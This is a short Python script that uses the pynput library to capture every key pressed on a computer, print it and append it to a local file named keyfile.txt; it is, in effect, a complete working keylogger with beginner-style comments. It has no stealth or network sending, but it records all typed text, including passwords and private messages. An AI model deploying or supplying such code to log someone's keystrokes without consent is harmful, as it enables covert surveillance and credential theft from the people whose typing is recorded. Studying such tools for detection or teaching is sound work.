from pynput import keyboard


#  handle what happens when a key is pressed
def on_press(key):
    try:
        # gets a normal key
        key_data = key.char if key.char else f'[{key.name}]'
    except AttributeError:
        # If the key, sidnt normal (like enter), handle it here
        key_data = f'[{key.name}]'

    print(key_data)

    # Open  a file to log the data
    with open("keyfile.txt", "a") as log_file:
        log_file.write(key_data)



def main():
    # Start the keyboard listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Keep the listener running.



if __name__ == "__main__":
    main()





